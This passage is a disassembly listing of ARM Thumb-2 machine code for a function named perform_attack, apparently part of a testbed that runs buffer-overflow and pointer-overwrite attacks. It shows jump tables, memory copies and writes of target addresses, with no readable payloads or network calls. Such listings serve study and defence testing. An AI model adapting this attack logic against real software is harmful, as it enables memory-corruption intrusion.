    a322:	f2c0 0100 	movt	r1, #0
    a326:	461a      	mov	r2, r3
    a328:	f7fe eb54 	blx	89d4 <_init+0x140>
    a32c:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    a330:	3bb4      	subs	r3, #180	; 0xb4
    a332:	681a      	ldr	r2, [r3, #0]
    a334:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a338:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    a33c:	681b      	ldr	r3, [r3, #0]
    a33e:	781b      	ldrb	r3, [r3, #0]
    a340:	4610      	mov	r0, r2
    a342:	f64c 61e8 	movw	r1, #52968	; 0xcee8
    a346:	f2c0 0100 	movt	r1, #0
    a34a:	461a      	mov	r2, r3
    a34c:	f7fe eb42 	blx	89d4 <_init+0x140>
    a350:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    a354:	3bb4      	subs	r3, #180	; 0xb4
    a356:	681a      	ldr	r2, [r3, #0]
    a358:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a35c:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a360:	689b      	ldr	r3, [r3, #8]
    a362:	4610      	mov	r0, r2
    a364:	f64c 7108 	movw	r1, #53000	; 0xcf08
    a368:	f2c0 0100 	movt	r1, #0
    a36c:	461a      	mov	r2, r3
    a36e:	f7fe eb32 	blx	89d4 <_init+0x140>
    a372:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    a376:	3bb4      	subs	r3, #180	; 0xb4
    a378:	681a      	ldr	r2, [r3, #0]
    a37a:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a37e:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a382:	4610      	mov	r0, r2
    a384:	4619      	mov	r1, r3
    a386:	f001 fbdf 	bl	bb48 <print_payload_info>
    a38a:	f507 5313 	add.w	r3, r7, #9408	; 0x24c0
    a38e:	f5a3 7361 	sub.w	r3, r3, #900	; 0x384
    a392:	4618      	mov	r0, r3
    a394:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    a398:	f10c 0cb0 	add.w	ip, ip, #176	; 0xb0
    a39c:	f8dc 1000 	ldr.w	r1, [ip]
    a3a0:	22c0      	movs	r2, #192	; 0xc0
    a3a2:	f001 fc77 	bl	bc94 <save_memory>
    a3a6:	f646 2388 	movw	r3, #27272	; 0x6a88
    a3aa:	f2c0 0301 	movt	r3, #1
    a3ae:	691b      	ldr	r3, [r3, #16]
    a3b0:	f5a3 73fa 	sub.w	r3, r3, #500	; 0x1f4
    a3b4:	2b0a      	cmp	r3, #10
    a3b6:	f200 8121 	bhi.w	a5fc <perform_attack+0x15a8>
    a3ba:	a001      	add	r0, pc, #4	; (adr r0, a3c0 <perform_attack+0x136c>)
    a3bc:	f850 f023 	ldr.w	pc, [r0, r3, lsl #2]
    a3c0:	0000a3ed 	.word	0x0000a3ed
    a3c4:	0000a419 	.word	0x0000a419
    a3c8:	0000a437 	.word	0x0000a437
    a3cc:	0000a461 	.word	0x0000a461
    a3d0:	0000a47f 	.word	0x0000a47f
    a3d4:	0000a4af 	.word	0x0000a4af
    a3d8:	0000a4cd 	.word	0x0000a4cd
    a3dc:	0000a4f7 	.word	0x0000a4f7
    a3e0:	0000a541 	.word	0x0000a541
    a3e4:	0000a5d1 	.word	0x0000a5d1
    a3e8:	0000a62b 	.word	0x0000a62b
    a3ec:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a3f0:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    a3f4:	6819      	ldr	r1, [r3, #0]
    a3f6:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a3fa:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a3fe:	68da      	ldr	r2, [r3, #12]
    a400:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a404:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a408:	685b      	ldr	r3, [r3, #4]
    a40a:	3b01      	subs	r3, #1
    a40c:	4608      	mov	r0, r1
    a40e:	4611      	mov	r1, r2
    a410:	461a      	mov	r2, r3
    a412:	f7fe ea80 	blx	8914 <_init+0x80>
    a416:	e109      	b.n	a62c <perform_attack+0x15d8>
    a418:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a41c:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    a420:	681a      	ldr	r2, [r3, #0]
    a422:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a426:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a42a:	68db      	ldr	r3, [r3, #12]
    a42c:	4610      	mov	r0, r2
    a42e:	4619      	mov	r1, r3
    a430:	f7fe ea94 	blx	895c <_init+0xc8>
    a434:	e0fa      	b.n	a62c <perform_attack+0x15d8>
    a436:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a43a:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    a43e:	6819      	ldr	r1, [r3, #0]
    a440:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a444:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a448:	68da      	ldr	r2, [r3, #12]
    a44a:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a44e:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a452:	685b      	ldr	r3, [r3, #4]
    a454:	4608      	mov	r0, r1
    a456:	4611      	mov	r1, r2
    a458:	461a      	mov	r2, r3
    a45a:	f7fe eae0 	blx	8a1c <_init+0x188>
    a45e:	e0e5      	b.n	a62c <perform_attack+0x15d8>
    a460:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a464:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    a468:	681a      	ldr	r2, [r3, #0]
    a46a:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a46e:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a472:	68db      	ldr	r3, [r3, #12]
    a474:	4610      	mov	r0, r2
    a476:	4619      	mov	r1, r3
    a478:	f7fe ea70 	blx	895c <_init+0xc8>
    a47c:	e0d6      	b.n	a62c <perform_attack+0x15d8>
    a47e:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a482:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    a486:	6819      	ldr	r1, [r3, #0]
    a488:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a48c:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a490:	685a      	ldr	r2, [r3, #4]
    a492:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a496:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a49a:	68db      	ldr	r3, [r3, #12]
    a49c:	4608      	mov	r0, r1
    a49e:	4611      	mov	r1, r2
    a4a0:	f64c 7224 	movw	r2, #53028	; 0xcf24
    a4a4:	f2c0 0200 	movt	r2, #0
    a4a8:	f7fe eaa0 	blx	89ec <_init+0x158>
    a4ac:	e0be      	b.n	a62c <perform_attack+0x15d8>
    a4ae:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a4b2:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    a4b6:	681a      	ldr	r2, [r3, #0]
    a4b8:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a4bc:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a4c0:	68db      	ldr	r3, [r3, #12]
    a4c2:	4610      	mov	r0, r2
    a4c4:	4619      	mov	r1, r3
    a4c6:	f7fe ea44 	blx	8950 <_init+0xbc>
    a4ca:	e0af      	b.n	a62c <perform_attack+0x15d8>
    a4cc:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a4d0:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    a4d4:	6819      	ldr	r1, [r3, #0]
    a4d6:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a4da:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a4de:	68da      	ldr	r2, [r3, #12]
    a4e0:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a4e4:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a4e8:	685b      	ldr	r3, [r3, #4]
    a4ea:	4608      	mov	r0, r1
    a4ec:	4611      	mov	r1, r2
    a4ee:	461a      	mov	r2, r3
    a4f0:	f7fe eaac 	blx	8a4c <_init+0x1b8>
    a4f4:	e09a      	b.n	a62c <perform_attack+0x15d8>
    a4f6:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a4fa:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a4fe:	685c      	ldr	r4, [r3, #4]
    a500:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a504:	f5a3 7337 	sub.w	r3, r3, #732	; 0x2dc
    a508:	4618      	mov	r0, r3
    a50a:	210f      	movs	r1, #15
    a50c:	f64c 7228 	movw	r2, #53032	; 0xcf28
    a510:	f2c0 0200 	movt	r2, #0
    a514:	4623      	mov	r3, r4
    a516:	f7fe ea6a 	blx	89ec <_init+0x158>
    a51a:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a51e:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a522:	68d9      	ldr	r1, [r3, #12]
    a524:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a528:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    a52c:	681a      	ldr	r2, [r3, #0]
    a52e:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a532:	f5a3 7337 	sub.w	r3, r3, #732	; 0x2dc
    a536:	4608      	mov	r0, r1
    a538:	4619      	mov	r1, r3
    a53a:	f7fe ea5e 	blx	89f8 <_init+0x164>
    a53e:	e075      	b.n	a62c <perform_attack+0x15d8>
    a540:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a544:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a548:	685c      	ldr	r4, [r3, #4]
    a54a:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a54e:	f5a3 7337 	sub.w	r3, r3, #732	; 0x2dc
    a552:	4618      	mov	r0, r3
    a554:	210f      	movs	r1, #15
    a556:	f64c 7228 	movw	r2, #53032	; 0xcf28
    a55a:	f2c0 0200 	movt	r2, #0
    a55e:	4623      	mov	r3, r4
    a560:	f7fe ea44 	blx	89ec <_init+0x158>
    a564:	f64c 7030 	movw	r0, #53040	; 0xcf30
    a568:	f2c0 0000 	movt	r0, #0
    a56c:	f64c 7144 	movw	r1, #53060	; 0xcf44
    a570:	f2c0 0100 	movt	r1, #0
    a574:	f7fe e9b0 	blx	88d8 <_init+0x44>
    a578:	f507 3152 	add.w	r1, r7, #215040	; 0x34800
    a57c:	f101 0194 	add.w	r1, r1, #148	; 0x94
    a580:	6008      	str	r0, [r1, #0]
    a582:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a586:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a58a:	68db      	ldr	r3, [r3, #12]
    a58c:	4618      	mov	r0, r3
    a58e:	f507 3252 	add.w	r2, r7, #215040	; 0x34800
    a592:	f102 0294 	add.w	r2, r2, #148	; 0x94
    a596:	6811      	ldr	r1, [r2, #0]
    a598:	f7fe ea5e 	blx	8a58 <_init+0x1c4>
    a59c:	f507 3352 	add.w	r3, r7, #215040	; 0x34800
    a5a0:	f103 0394 	add.w	r3, r3, #148	; 0x94
    a5a4:	6818      	ldr	r0, [r3, #0]
    a5a6:	f7fe e9c2 	blx	892c <_init+0x98>
    a5aa:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a5ae:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    a5b2:	681a      	ldr	r2, [r3, #0]
    a5b4:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a5b8:	f5a3 7337 	sub.w	r3, r3, #732	; 0x2dc
    a5bc:	f507 3c52 	add.w	ip, r7, #215040	; 0x34800
    a5c0:	f10c 0c94 	add.w	ip, ip, #148	; 0x94
    a5c4:	f8dc 0000 	ldr.w	r0, [ip]
    a5c8:	4619      	mov	r1, r3
    a5ca:	f7fe e980 	blx	88cc <_init+0x38>
    a5ce:	e02d      	b.n	a62c <perform_attack+0x15d8>
    a5d0:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a5d4:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    a5d8:	6819      	ldr	r1, [r3, #0]
    a5da:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a5de:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a5e2:	68da      	ldr	r2, [r3, #12]
    a5e4:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a5e8:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a5ec:	685b      	ldr	r3, [r3, #4]
    a5ee:	3b01      	subs	r3, #1
    a5f0:	4608      	mov	r0, r1
    a5f2:	4611      	mov	r1, r2
    a5f4:	461a      	mov	r2, r3
    a5f6:	f001 ff5f 	bl	c4b8 <homebrew_memcpy>
    a5fa:	e017      	b.n	a62c <perform_attack+0x15d8>
    a5fc:	f646 0350 	movw	r3, #26704	; 0x6850
    a600:	f2c0 0301 	movt	r3, #1
    a604:	681b      	ldr	r3, [r3, #0]
    a606:	2b00      	cmp	r3, #0
    a608:	d00c      	beq.n	a624 <perform_attack+0x15d0>
    a60a:	f646 0360 	movw	r3, #26720	; 0x6860
    a60e:	f2c0 0301 	movt	r3, #1
    a612:	681b      	ldr	r3, [r3, #0]
    a614:	f64c 7048 	movw	r0, #53064	; 0xcf48
    a618:	f2c0 0000 	movt	r0, #0
    a61c:	2101      	movs	r1, #1
    a61e:	2222      	movs	r2, #34	; 0x22
    a620:	f7fe e990 	blx	8944 <_init+0xb0>
    a624:	2001      	movs	r0, #1
    a626:	f7fe e9c4 	blx	89b0 <_init+0x11c>
    a62a:	bf00      	nop
    a62c:	f646 2388 	movw	r3, #27272	; 0x6a88
    a630:	f2c0 0301 	movt	r3, #1
    a634:	681b      	ldr	r3, [r3, #0]
    a636:	2b64      	cmp	r3, #100	; 0x64
    a638:	f000 8184 	beq.w	a944 <perform_attack+0x18f0>
    a63c:	2b65      	cmp	r3, #101	; 0x65
    a63e:	f040 816a 	bne.w	a916 <perform_attack+0x18c2>
    a642:	f646 2388 	movw	r3, #27272	; 0x6a88
    a646:	f2c0 0301 	movt	r3, #1
    a64a:	685b      	ldr	r3, [r3, #4]
    a64c:	3bc8      	subs	r3, #200	; 0xc8
    a64e:	2b04      	cmp	r3, #4
    a650:	f200 8129 	bhi.w	a8a6 <perform_attack+0x1852>
    a654:	a001      	add	r0, pc, #4	; (adr r0, a65c <perform_attack+0x1608>)
    a656:	f850 f023 	ldr.w	pc, [r0, r3, lsl #2]
    a65a:	bf00      	nop
    a65c:	0000a671 	.word	0x0000a671
    a660:	0000a671 	.word	0x0000a671
    a664:	0000a671 	.word	0x0000a671
    a668:	0000a6d5 	.word	0x0000a6d5
    a66c:	0000a671 	.word	0x0000a671
    a670:	f646 2388 	movw	r3, #27272	; 0x6a88
    a674:	f2c0 0301 	movt	r3, #1
    a678:	689a      	ldr	r2, [r3, #8]
    a67a:	f240 132d 	movw	r3, #301	; 0x12d
    a67e:	429a      	cmp	r2, r3
    a680:	d11a      	bne.n	a6b8 <perform_attack+0x1664>
    a682:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a686:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    a68a:	681b      	ldr	r3, [r3, #0]
    a68c:	681b      	ldr	r3, [r3, #0]
    a68e:	461a      	mov	r2, r3
    a690:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a694:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    a698:	6819      	ldr	r1, [r3, #0]
    a69a:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a69e:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a6a2:	6858      	ldr	r0, [r3, #4]
    a6a4:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a6a8:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a6ac:	69db      	ldr	r3, [r3, #28]
    a6ae:	1ac3      	subs	r3, r0, r3
    a6b0:	3b09      	subs	r3, #9
    a6b2:	440b      	add	r3, r1
    a6b4:	6013      	str	r3, [r2, #0]
    a6b6:	e10d      	b.n	a8d4 <perform_attack+0x1880>
    a6b8:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a6bc:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    a6c0:	681b      	ldr	r3, [r3, #0]
    a6c2:	681b      	ldr	r3, [r3, #0]
    a6c4:	461a      	mov	r2, r3
    a6c6:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a6ca:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    a6ce:	681b      	ldr	r3, [r3, #0]
    a6d0:	6013      	str	r3, [r2, #0]
    a6d2:	e0ff      	b.n	a8d4 <perform_attack+0x1880>
    a6d4:	f646 2388 	movw	r3, #27272	; 0x6a88
    a6d8:	f2c0 0301 	movt	r3, #1
    a6dc:	689b      	ldr	r3, [r3, #8]
    a6de:	f5b3 7f96 	cmp.w	r3, #300	; 0x12c
    a6e2:	d02a      	beq.n	a73a <perform_attack+0x16e6>
    a6e4:	f646 2388 	movw	r3, #27272	; 0x6a88
    a6e8:	f2c0 0301 	movt	r3, #1
    a6ec:	689a      	ldr	r2, [r3, #8]
    a6ee:	f240 1333 	movw	r3, #307	; 0x133
    a6f2:	429a      	cmp	r2, r3
    a6f4:	d021      	beq.n	a73a <perform_attack+0x16e6>
    a6f6:	f646 2388 	movw	r3, #27272	; 0x6a88
    a6fa:	f2c0 0301 	movt	r3, #1
    a6fe:	689b      	ldr	r3, [r3, #8]
    a700:	f5b3 7f9a 	cmp.w	r3, #308	; 0x134
    a704:	d019      	beq.n	a73a <perform_attack+0x16e6>
    a706:	f646 2388 	movw	r3, #27272	; 0x6a88
    a70a:	f2c0 0301 	movt	r3, #1
    a70e:	689a      	ldr	r2, [r3, #8]
    a710:	f240 1335 	movw	r3, #309	; 0x135
    a714:	429a      	cmp	r2, r3
    a716:	d010      	beq.n	a73a <perform_attack+0x16e6>
    a718:	f646 2388 	movw	r3, #27272	; 0x6a88
    a71c:	f2c0 0301 	movt	r3, #1
    a720:	689b      	ldr	r3, [r3, #8]
    a722:	f5b3 7f9b 	cmp.w	r3, #310	; 0x136
    a726:	d008      	beq.n	a73a <perform_attack+0x16e6>
    a728:	f646 2388 	movw	r3, #27272	; 0x6a88
    a72c:	f2c0 0301 	movt	r3, #1
    a730:	689a      	ldr	r2, [r3, #8]
    a732:	f240 1337 	movw	r3, #311	; 0x137
    a736:	429a      	cmp	r2, r3
    a738:	d10c      	bne.n	a754 <perform_attack+0x1700>
    a73a:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a73e:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    a742:	681b      	ldr	r3, [r3, #0]
    a744:	681b      	ldr	r3, [r3, #0]
    a746:	461a      	mov	r2, r3
    a748:	f648 13e0 	movw	r3, #35296	; 0x89e0
    a74c:	f2c0 0300 	movt	r3, #0
    a750:	6013      	str	r3, [r2, #0]
    a752:	e0a7      	b.n	a8a4 <perform_attack+0x1850>
    a754:	f646 2388 	movw	r3, #27272	; 0x6a88
    a758:	f2c0 0301 	movt	r3, #1
    a75c:	689a      	ldr	r2, [r3, #8]
    a75e:	f240 132d 	movw	r3, #301	; 0x12d
    a762:	429a      	cmp	r2, r3
    a764:	f040 8091 	bne.w	a88a <perform_attack+0x1836>
    a768:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a76c:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    a770:	681b      	ldr	r3, [r3, #0]
    a772:	681b      	ldr	r3, [r3, #0]
    a774:	461a      	mov	r2, r3
    a776:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a77a:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    a77e:	6819      	ldr	r1, [r3, #0]
    a780:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a784:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a788:	6858      	ldr	r0, [r3, #4]
    a78a:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a78e:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a792:	69db      	ldr	r3, [r3, #28]
    a794:	1ac3      	subs	r3, r0, r3
    a796:	3b09      	subs	r3, #9
    a798:	440b      	add	r3, r1
    a79a:	6013      	str	r3, [r2, #0]
    a79c:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a7a0:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    a7a4:	681b      	ldr	r3, [r3, #0]
    a7a6:	681b      	ldr	r3, [r3, #0]
    a7a8:	681b      	ldr	r3, [r3, #0]
    a7aa:	f64c 706c 	movw	r0, #53100	; 0xcf6c
    a7ae:	f2c0 0000 	movt	r0, #0
    a7b2:	4619      	mov	r1, r3
    a7b4:	f7fe e884 	blx	88c0 <_init+0x2c>
    a7b8:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a7bc:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    a7c0:	681b      	ldr	r3, [r3, #0]
    a7c2:	681b      	ldr	r3, [r3, #0]
    a7c4:	681b      	ldr	r3, [r3, #0]
    a7c6:	681b      	ldr	r3, [r3, #0]
    a7c8:	f64c 7094 	movw	r0, #53140	; 0xcf94
    a7cc:	f2c0 0000 	movt	r0, #0
    a7d0:	4619      	mov	r1, r3
    a7d2:	f7fe e876 	blx	88c0 <_init+0x2c>
    a7d6:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a7da:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    a7de:	681b      	ldr	r3, [r3, #0]
    a7e0:	681b      	ldr	r3, [r3, #0]
    a7e2:	681b      	ldr	r3, [r3, #0]
    a7e4:	3304      	adds	r3, #4
    a7e6:	681b      	ldr	r3, [r3, #0]
    a7e8:	f64c 70c8 	movw	r0, #53192	; 0xcfc8
    a7ec:	f2c0 0000 	movt	r0, #0
    a7f0:	4619      	mov	r1, r3
    a7f2:	f7fe e866 	blx	88c0 <_init+0x2c>
    a7f6:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a7fa:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    a7fe:	681b      	ldr	r3, [r3, #0]
    a800:	681b      	ldr	r3, [r3, #0]
    a802:	681b      	ldr	r3, [r3, #0]
    a804:	3308      	adds	r3, #8
    a806:	681b      	ldr	r3, [r3, #0]
    a808:	f24d 0000 	movw	r0, #53248	; 0xd000
    a80c:	f2c0 0000 	movt	r0, #0
    a810:	4619      	mov	r1, r3
    a812:	f7fe e856 	blx	88c0 <_init+0x2c>
    a816:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a81a:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    a81e:	681b      	ldr	r3, [r3, #0]
    a820:	681b      	ldr	r3, [r3, #0]
    a822:	681b      	ldr	r3, [r3, #0]
    a824:	330c      	adds	r3, #12
    a826:	681b      	ldr	r3, [r3, #0]
    a828:	f24d 0038 	movw	r0, #53304	; 0xd038
    a82c:	f2c0 0000 	movt	r0, #0
    a830:	4619      	mov	r1, r3
    a832:	f7fe e846 	blx	88c0 <_init+0x2c>
    a836:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a83a:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    a83e:	681b      	ldr	r3, [r3, #0]
    a840:	681b      	ldr	r3, [r3, #0]
    a842:	681b      	ldr	r3, [r3, #0]
    a844:	3310      	adds	r3, #16
    a846:	681b      	ldr	r3, [r3, #0]
    a848:	f24d 0070 	movw	r0, #53360	; 0xd070
    a84c:	f2c0 0000 	movt	r0, #0
    a850:	4619      	mov	r1, r3
    a852:	f7fe e836 	blx	88c0 <_init+0x2c>
    a856:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a85a:	f5a3 7332 	sub.w	r3, r3, #712	; 0x2c8
    a85e:	681a      	ldr	r2, [r3, #0]
    a860:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a864:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a868:	6859      	ldr	r1, [r3, #4]
    a86a:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a86e:	f5a3 7341 	sub.w	r3, r3, #772	; 0x304
    a872:	69db      	ldr	r3, [r3, #28]
    a874:	1acb      	subs	r3, r1, r3
    a876:	3b09      	subs	r3, #9
    a878:	4413      	add	r3, r2
    a87a:	f24d 00a8 	movw	r0, #53416	; 0xd0a8
    a87e:	f2c0 0000 	movt	r0, #0
    a882:	4619      	mov	r1, r3
    a884:	f7fe e81c 	blx	88c0 <_init+0x2c>
    a888:	e00c      	b.n	a8a4 <perform_attack+0x1850>
    a88a:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a88e:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    a892:	681b      	ldr	r3, [r3, #0]
    a894:	681b      	ldr	r3, [r3, #0]
    a896:	461a      	mov	r2, r3
    a898:	f648 1398 	movw	r3, #35224	; 0x8998
    a89c:	f2c0 0300 	movt	r3, #0
    a8a0:	6013      	str	r3, [r2, #0]
    a8a2:	e017      	b.n	a8d4 <perform_attack+0x1880>
    a8a4:	e016      	b.n	a8d4 <perform_attack+0x1880>
    a8a6:	f646 0350 	movw	r3, #26704	; 0x6850
    a8aa:	f2c0 0301 	movt	r3, #1
    a8ae:	681b      	ldr	r3, [r3, #0]
    a8b0:	2b00      	cmp	r3, #0
    a8b2:	d00c      	beq.n	a8ce <perform_attack+0x187a>
    a8b4:	f646 0360 	movw	r3, #26720	; 0x6860
    a8b8:	f2c0 0301 	movt	r3, #1
    a8bc:	681b      	ldr	r3, [r3, #0]
    a8be:	f24d 00cc 	movw	r0, #53452	; 0xd0cc
    a8c2:	f2c0 0000 	movt	r0, #0
    a8c6:	2101      	movs	r1, #1
    a8c8:	222b      	movs	r2, #43	; 0x2b
    a8ca:	f7fe e83c 	blx	8944 <_init+0xb0>
    a8ce:	2001      	movs	r0, #1
    a8d0:	f7fe e86e 	blx	89b0 <_init+0x11c>
    a8d4:	f646 2380 	movw	r3, #27264	; 0x6a80
    a8d8:	f2c0 0301 	movt	r3, #1
    a8dc:	681b      	ldr	r3, [r3, #0]
    a8de:	2b00      	cmp	r3, #0
    a8e0:	d018      	beq.n	a914 <perform_attack+0x18c0>
    a8e2:	f107 03c0 	add.w	r3, r7, #192	; 0xc0
    a8e6:	3bb4      	subs	r3, #180	; 0xb4
    a8e8:	6819      	ldr	r1, [r3, #0]
    a8ea:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a8ee:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    a8f2:	681b      	ldr	r3, [r3, #0]
    a8f4:	681a      	ldr	r2, [r3, #0]
    a8f6:	f507 5353 	add.w	r3, r7, #13504	; 0x34c0
    a8fa:	f5a3 7333 	sub.w	r3, r3, #716	; 0x2cc
    a8fe:	681b      	ldr	r3, [r3, #0]
    a900:	681b      	ldr	r3, [r3, #0]
    a902:	681b      	ldr	r3, [r3, #0]
    a904:	4608      	mov	r0, r1
    a906:	f24d 01f8 	movw	r1, #53496	; 0xd0f8
    a90a:	f2c0 0100 	movt	r1, #0
    a90e:	f7fe e862 	blx	89d4 <_init+0x140>
    a912:	e018      	b.n	a946 <perform_attack+0x18f2>
    a914:	e017      	b.n	a946 <perform_attack+0x18f2>
    a916:	f646 0350 	movw	r3, #26704	; 0x6850
    a91a:	f2c0 0301 	movt	r3, #1
    a91e:	681b      	ldr	r3, [r3, #0]
    a920:	2b00      	cmp	r3, #0
    a922:	d00c      	beq.n	a93e <perform_attack+0x18ea>
    a924:	f646 0360 	movw	r3, #26720	; 0x6860
    a928:	f2c0 0301 	movt	r3, #1
    a92c:	681b      	ldr	r3, [r3, #0]
    a92e:	f64c 400c 	movw	r0, #52236	; 0xcc0c
    a932:	f2c0 0000 	movt	r0, #0
    a936:	2101      	movs	r1, #1
    a938:	2223      	movs	r2, #35	; 0x23
    a93a:	f7fe e804 	blx	8944 <_init+0xb0>
    a93e:	2001      	movs	r0, #1
    a940:	f7fe e836 	blx	89b0 <_init+0x11c>
    a944:	bf00      	nop
    a946:	f646 2380 	movw	r3, #27264	; 0x6a80
    a94a:	f2c0 0301 	movt	r3, #1
    a94e:	681b      	ldr	r3, [r3, #0]
    a950:	2b00      	cmp	r3, #0
    a952:	f040 8169 	bne.w	ac28 <perform_attack+0x1bd4>
    a956:	f646 2388 	movw	r3, #27272	; 0x6a88
    a95a:	f2c0 0301 	movt	r3, #1
    a95e:	689b      	ldr	r3, [r3, #8]
    a960:	f5a3 7396 	sub.w	r3, r3, #300	; 0x12c
    a964:	2b0f      	cmp	r3, #15
    a966:	f200 8147 	bhi.w	abf8 <perform_attack+0x1ba4>
    a96a:	a101      	add	r1, pc, #4	; (adr r1, a970 <perform_attack+0x191c>)
    a96c:	f851 f023 	ldr.w	pc, [r1, r3, lsl #2]
    a970:	0000ac27 	.word	0x0000ac27
    a974:	0000ac27 	.word	0x0000ac27
    a978:	0000a9b1 	.word	0x0000a9b1
    a97c:	0000a9cb 	.word	0x0000a9cb
    a980:	0000a9e3 	.word	0x0000a9e3
    a984:	0000a9ff 	.word	0x0000a9ff
    a988:	0000aa19 	.word	0x0000aa19
    a98c:	0000aa61 	.word	0x0000aa61
    a990:	0000aa71 	.word	0x0000aa71
